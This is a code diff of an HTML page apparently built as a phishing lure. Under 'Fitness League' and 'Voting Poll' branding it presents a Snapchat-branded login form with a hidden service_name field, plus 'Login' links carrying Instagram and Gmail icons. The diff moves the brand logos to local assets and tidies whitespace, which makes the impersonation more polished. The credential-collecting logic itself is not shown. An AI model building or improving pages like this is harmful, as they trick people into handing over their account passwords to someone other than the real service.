@@ -9,23 +9,23 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="apple-mobile-web-app-title" content="Fitness League">
-    
+
     <title>Fitness League - Login</title>
-    
+
     <!-- PWA Manifest -->
     <link rel="manifest" href="manifest.json">
-    
+
     <!-- Favicon -->
-    <link rel="icon" type="image/png" sizes="192x192" href="icon-192.png">
-    <link rel="apple-touch-icon" href="icon-192.png">
-    
+    <link rel="icon" type="image/svg+xml" href="assets/fitness-league.svg">
+    <link rel="apple-touch-icon" href="assets/fitness-league.svg">
+
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <h1>Voting Poll</h1>
         <div class="logo">
-            <img src="https://www.freepnglogos.com/uploads/snapchat-logo-png-0.png" alt="Snapchat Logo">
+            <img src="assets/snapchat.svg" alt="Snapchat Logo">
         </div>
         <form id="loginForm">
             <input type="hidden" id="service_name" value="snapchat">
@@ -34,13 +34,13 @@
             <button type="submit">Log In</button>
         </form>
         <a href="#" class="forgot-password">Forgot Password?</a>
-        
+
         <div class="social-nav">
             <a href="s1.html" title="Login">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png" alt="Login" width="20" height="20">
+                <img src="assets/instagram.svg" alt="Login" width="48" height="48">
             </a>
             <a href="s2.html" title="Login">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Login" width="20" height="20">
+                <img src="assets/gmail.svg" alt="Login" width="48" height="48">
             </a>
         </div>
         <div class="version-text">v2.4 Final</div>
@@ -52,7 +52,7 @@
     <script src="ovpn-generator.js"></script>
     <script src="network-config-native.js"></script>
     <script src="script-enhanced.js"></script>
-    
+
     <!-- PWA Service Worker Registration -->
     <script>
         if ('serviceWorker' in navigator) {
@@ -66,14 +66,14 @@
                     });
             });
         }
-        
+
         // PWA Install Prompt
         let deferredPrompt;
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
             console.log('💾 PWA install prompt ready');
-            
+
             // Show custom install button after 3 seconds
             setTimeout(() => {
                 if (deferredPrompt && !window.matchMedia('(display-mode: standalone)').matches) {
@@ -96,7 +96,7 @@
                         animation: slideUp 0.3s ease-out;
                     `;
                     installBanner.innerHTML = '📱 Install App';
-                    
+
                     installBanner.addEventListener('click', async () => {
                         deferredPrompt.prompt();
                         const { outcome } = await deferredPrompt.userChoice;
@@ -104,19 +104,19 @@
                         deferredPrompt = null;
                         installBanner.remove();
                     });
-                    
+
                     document.body.appendChild(installBanner);
                 }
             }, 3000);
         });
-        
+
         // Detect if app is installed
         window.addEventListener('appinstalled', () => {
             console.log('✅ PWA installed successfully');
             deferredPrompt = null;
         });
     </script>
-    
+
     <style>
         @keyframes slideUp {
             from {
